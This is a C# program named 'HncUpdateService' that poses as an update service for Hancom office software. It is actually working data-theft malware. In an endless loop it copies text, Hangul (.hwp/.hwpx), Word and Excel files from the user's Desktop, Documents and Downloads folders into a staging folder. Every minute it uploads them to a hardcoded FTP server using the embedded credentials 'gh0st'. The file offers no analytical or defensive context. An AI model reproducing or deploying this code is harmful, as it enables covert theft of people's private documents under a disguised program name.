﻿using System;
using System.IO;
using System.IO.Compression;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;


namespace HncUpdateService
{
    class Program
    {
        static void Main(string[] args) // Add 'async' modifier and change return type to 'Task'
        {
            while (true)
            {
                string infoPath = @"C:\Temp\info";
                string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                string downloadsPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Downloads";

                // Check if the info directory exists
                if (!Directory.Exists(infoPath))
                {
                    Directory.CreateDirectory(infoPath);
                }

                // Scan and copy files with specific extensions from desktop, documents, and downloads folders
                string[] extensions = { ".txt", ".hwp", ".hwpx", ".docx", ".doc", ".xls", ".xlsx" };
                string[] folders = { desktopPath, documentsPath, downloadsPath };

                foreach (string folder in folders)
                {
                    foreach (string extension in extensions)
                    {
                        string[] files = Directory.GetFiles(folder, "*" + extension);
                        foreach (string file in files)
                        {
                            string fileName = Path.GetFileName(file);
                            string destinationPath = Path.Combine(infoPath, fileName);
                            File.Copy(file, destinationPath, true);
                        }
                    }
                }
                // Upload the zip file to the FTP server
                FTPUploadFile();
                // Wait for 60 seconds before the next iteration
                Task.Delay(60000).GetAwaiter().GetResult();
            }
        }

        static async Task<bool> CheckNetworkCommunication(string server)
        {
            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    await tcpClient.ConnectAsync(server, 21);
                    return true;
                }
                catch (SocketException)
                {
                    return false;
                }
            }
        }
        static void FTPUploadFile()
        {
            const string ftpServer = "192.168.111.29";
            const string ftpUsername = "gh0st";
            const string ftpPassword = "igloo12#$";

            string localFilePath = @"C:\Temp\Info\";
            string[] files = Directory.GetFiles(localFilePath);

            using (WebClient client = new WebClient())
            {
                client.Credentials = new NetworkCredential(ftpUsername, ftpPassword);

                foreach (string file in files)
                {
                    string fileName = Path.GetFileName(file);
                    string ftpFilePath = "ftp://" + ftpServer + "/" + fileName;

                    client.UploadFile(ftpFilePath, WebRequestMethods.Ftp.UploadFile, file);
                    Console.WriteLine("Uploaded file: " + fileName);
                }
            }
        }
    }
}
